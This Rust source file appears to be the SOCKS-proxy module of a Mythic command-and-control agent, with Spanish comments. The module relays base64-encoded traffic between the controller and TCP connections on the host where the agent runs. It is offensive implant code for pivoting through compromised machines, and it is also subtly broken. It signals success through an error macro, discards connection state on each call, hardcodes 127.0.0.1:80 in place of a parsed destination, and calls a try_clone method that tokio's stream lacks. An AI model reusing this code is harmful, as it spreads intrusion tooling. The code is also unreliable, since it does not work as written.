// socks.rs
use crate::agent::AgentTask;
use crate::mythic_error;  // ← USA mythic_error EN LUGAR DE mythic_continued
use base64::{engine::general_purpose::STANDARD, Engine};
use serde::Deserialize;
use std::error::Error;
use std::sync::{mpsc, Arc, Mutex};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

#[derive(Deserialize)]
pub struct SocksMsg {
    pub exit: bool,
    pub server_id: u32,
    pub data: String,
}

// Define SocksState aquí
pub struct SocksState {
    pub connections: Arc<Mutex<Vec<(u32, TcpStream)>>>,
    pub outbound: Arc<Mutex<Vec<SocksMsg>>>,
}

impl SocksState {
    pub fn new() -> Self {
        Self {
            connections: Arc::new(Mutex::new(Vec::new())),
            outbound: Arc::new(Mutex::new(Vec::new())),
        }
    }
}

// Asegúrate de que start_socks esté definida correctamente
pub fn start_socks(tx: &mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    
    // Usa mythic_error con status "success" para indicar éxito
    tx.send(mythic_error!(task.id, "SOCKS relay started"))?;

    let rt = tokio::runtime::Runtime::new()?;
    rt.block_on(relay_loop(tx.clone(), rx));
    Ok(())
}

// ... el resto del código de socks.rs permanece igual
async fn relay_loop(tx: mpsc::Sender<serde_json::Value>, mut rx: mpsc::Receiver<serde_json::Value>) {
    while let Ok(msg) = rx.recv() {
        if let Ok(task) = serde_json::from_value::<AgentTask>(msg) {
            if task.command == "socks_data" {
                if let Ok(msgs) = serde_json::from_str::<Vec<SocksMsg>>(&task.parameters) {
                    process_messages(&tx, msgs).await;
                }
            }
        }
    }
}

async fn process_messages(tx: &mpsc::Sender<serde_json::Value>, msgs: Vec<SocksMsg>) {
    let socks_state = SocksState::new();
    let mut conns = socks_state.connections.lock().unwrap();
    let mut outbound = socks_state.outbound.lock().unwrap();

    for msg in msgs {
        if msg.exit {
            conns.retain(|(id, _)| *id != msg.server_id);
            continue;
        }

        let data = STANDARD.decode(&msg.data).unwrap_or_default();
        
        if let Some(pos) = conns.iter().position(|(id, _)| *id == msg.server_id) {
            let (_, stream) = &mut conns[pos];
            let _ = stream.write_all(&data).await;
        } else {
            if let Ok(stream) = TcpStream::connect("127.0.0.1:80").await {
                conns.push((msg.server_id, stream));
                // Clona el stream para pasarlo a relay_stream
                if let Some((_, ref stream)) = conns.last() {
                    let stream_clone = stream.try_clone().unwrap();
                    tokio::spawn(relay_stream(msg.server_id, stream_clone, tx.clone()));
                }
            }
        }
    }

    if !outbound.is_empty() {
        let json = serde_json::to_string(&*outbound).unwrap();
        let _ = tx.send(serde_json::json!({
            "command": "socks_data",
            "parameters": json,
            "id": "socks_outbound"
        }));
        outbound.clear();
    }
}

async fn relay_stream(id: u32, mut stream: TcpStream, tx: mpsc::Sender<serde_json::Value>) {
    let mut buf = [0u8; 4096];
    loop {
        match stream.read(&mut buf).await {
            Ok(0) => break,
            Ok(n) => {
                let data = STANDARD.encode(&buf[..n]);
                let msg = SocksMsg { exit: false, server_id: id, data };
                let json = serde_json::to_string(&vec![msg]).unwrap();
                let _ = tx.send(serde_json::json!({
                    "command": "socks_data",
                    "parameters": json,
                    "id": "socks_outbound"
                }));
            }
            Err(_) => break,
        }
    }
    let _ = tx.send(serde_json::json!({
        "command": "socks_data",
        "parameters": serde_json::to_string(&vec![SocksMsg { exit: true, server_id: id, data: String::new() }]).unwrap(),
        "id": "socks_outbound"
    }));
}
